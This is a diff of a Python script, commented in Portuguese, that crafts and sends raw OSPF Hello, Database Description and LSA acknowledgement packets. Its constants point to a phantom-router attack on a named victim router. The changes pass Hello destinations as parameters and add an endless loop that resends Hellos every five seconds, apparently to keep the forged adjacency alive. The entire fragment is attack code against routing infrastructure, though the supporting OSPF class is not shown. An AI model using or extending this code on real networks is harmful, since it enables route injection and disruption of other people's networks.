@@ -41,13 +41,13 @@ def base_package(length, dst_ip='224.0.0.5', dst_mac='01:00:5e:00:00:05'):
 
 
 
-def hello_packet(ospf):
+def hello_packet(ospf, dst_ip='224.0.0.5', dst_mac='01:00:5e:00:00:05'):
     '''
         Montagem do pacote COMPLETO de OSPF HELLO a ser enviado
     '''
     hello_data = ospf.hello_packet('255.255.255.0', DESIGNATED_ROUTER,
                                     BKP_ROUTER, VICTIM_ROUTER_ID)
-    return base_package(len(hello_data), DESIGNATED_ROUTER, DESIGNATED_ROUTER_MAC) + hello_data
+    return base_package(len(hello_data), dst_ip, dst_mac) + hello_data
 
 
 
@@ -74,7 +74,7 @@ def main():
     ospf = OSPF(PHANTON_ID, AREA_ID)
 
     # ================= Enviando HELLO =================
-    s.send(hello_packet(ospf))
+    s.send(hello_packet(ospf, DESIGNATED_ROUTER, DESIGNATED_ROUTER_MAC))
 
     # ================= Enviando DATABASE DESCRIPTION =================
     s.send(dbd_description_packet(ospf, FIRST_DB, 1))
@@ -108,7 +108,7 @@ def main():
             # verifica se o pacote ospf é um LSA UPDATE
             if ospf_header[1] == 0x04:
                 rest_of_package = headers[58:]
-                
+                # pula 4 posições para ignorar o campo LSA quantity
                 actual_pos = 62
 
                 print 'CHEGOU LSA UPDATE'
@@ -130,8 +130,11 @@ def main():
 
                 s.send(base_package(len(lsa_ack_pkt), DESIGNATED_ROUTER, DESIGNATED_ROUTER_MAC) + lsa_ack_pkt)
 
+                break
     
-    
+    while 1 == 1:
+        s.send(hello_packet(ospf))    
+        sleep(5)
     
 if __name__ == '__main__':
     main()
